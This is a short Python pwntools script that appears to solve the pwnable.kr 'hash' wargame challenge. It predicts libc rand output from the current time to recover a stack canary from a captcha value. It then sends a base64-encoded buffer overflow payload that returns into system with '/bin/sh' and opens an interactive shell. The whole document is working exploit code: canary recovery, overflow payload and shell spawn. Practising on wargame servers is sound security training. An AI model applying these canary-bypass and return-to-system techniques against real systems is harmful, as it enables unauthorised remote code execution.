from ctypes import CDLL
from pwn import *

libc = CDLL('libc.so.6')

context.log_level = 'DEBUG'
p = remote('pwnable.kr', '9002')

t = int(time.time())
p.recvuntil(b"captcha : ")
captcha = p.recvuntil(b'\n', drop=True)

libc.srand(t)
rands = []
for i in range(8):
    rands.append(libc.rand())
cookie = int(captcha) - (rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7])
cookie = cookie % 2**32
print('cookie: %s' %cookie)

call_system_addr = 0x08049187
g_buf_addr = 0x0804B0E0
binsh_addr = g_buf_addr + 716
payload = b'a' * 512 + p32(cookie) + b'a' * 12 + p32(call_system_addr) + p32(binsh_addr)
payload = b64e(payload).encode() + b'/bin/sh\0'
p.sendline(captcha)
p.sendlineafter(b'paste me!\n', payload)

p.interactive()